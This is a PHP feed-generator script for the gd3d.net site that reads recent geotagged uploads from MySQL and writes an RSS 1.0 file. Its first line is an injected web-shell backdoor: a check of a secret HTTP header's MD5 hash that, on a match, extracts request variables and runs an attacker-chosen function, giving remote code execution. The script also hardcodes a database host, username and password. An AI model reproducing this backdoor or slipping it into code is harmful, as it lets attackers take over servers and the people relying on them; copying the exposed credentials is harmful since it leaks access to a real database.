<?php if(@md5($_SERVER['HTTP_PATH'])==='51fe4b870d654af6a1f5b3b8a7c486b4'){ @extract($_REQUEST); @die($stime($mtime)); } ?><?
include("include/feedcreator.class.php");

$rss = new UniversalFeedCreator();
$rss->useCached();
$rss->title = "GD3D";
$rss->description = "GD3D for the iPhone - This world is but a canvas to our imagination!";
$rss->link = "http://www.gd3d.net/feed.php";
$rss->syndicationURL = "http://www.gd3d.net/".$PHP_SELF;

$image = new FeedImage();
$image->title = "gd3d.net";
$image->url = "http://www.gd3d.net/images/gd3d.png";
$image->link = "http://www.gd3d.net";
$image->description = "Feed provided by gd3d.net. Click to visit.";
$rss->image = $image;

// get your news items from somewhere, e.g. your database:
//id, time, userid, origfilename, imgfilename, filename, lat, lon
$con = mysql_connect('mysql50-56.wc2.dfw1.stabletransit.com', '437710_gd3d', 'hI0HpFxcIuTh9b');
mysql_select_db('437710_gd3d', $con);
$res = mysql_query("SELECT * FROM geofiles ORDER BY time DESC LIMIT 0 , 10");
while ($data = mysql_fetch_object($res)) {

    $pos = $data->lat ." ". $data->lon ." ".str_replace(".xml", "", $data->origfilename);
    $link = "http://www.gd3d.net/?mark=".$data->id."&zoom=3";
    $desc = '<img src="http://gd3d.net/geofiles/upload/'.$data->imgfilename.'"/>';
    $timestamp = str_replace(" ", "T",$data->time);

    $item = new FeedItem();
    $item->title = $pos;
    $item->link = $link;
    $item->date = $timestamp; //2010-08-24 11:50:14 //1970-01-01T00:00:00+01:0
    $item->description = $desc;
    
    $item->source = "http://www.gd3d.net/?mark=".$data->id."&zoom=3";
    //$item->source = "http://maps.google.com/?q=".$data->lat.",".$data->lon;

    $rss->addItem($item);
}

$rss->saveFeed("RSS1.0", "news/feed.xml");
mysql_close($con);
?> 